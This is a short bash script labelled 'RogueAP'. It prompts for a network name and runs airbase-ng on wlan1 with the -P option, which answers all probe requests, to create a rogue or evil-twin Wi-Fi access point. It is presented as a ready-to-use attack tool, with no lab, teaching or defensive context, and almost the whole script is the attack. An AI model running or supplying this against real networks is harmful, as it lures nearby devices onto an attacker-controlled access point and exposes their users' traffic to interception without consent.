#!/bin/bash


#colors
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'

echo -e $yellow"Starting RogueAP"
echo -ne $green"Choose a name for your AP:" ;tput sgr0
read nameap
sleep 1
echo -e $red"[!] YOU NEED WLAN1 INTERFACE FOR THESE [!]"
sleep 1
echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
sleep 2
sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1
